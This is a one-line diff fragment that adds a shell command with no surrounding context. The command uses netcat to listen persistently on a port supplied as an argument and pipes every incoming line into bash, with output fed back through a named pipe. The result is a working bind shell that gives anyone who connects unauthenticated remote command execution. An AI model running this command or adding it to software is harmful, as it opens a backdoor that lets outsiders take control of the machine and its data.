@@ -1,0 +1,1 @@
+cat pipe | nc -kl $1 | bash > pipe
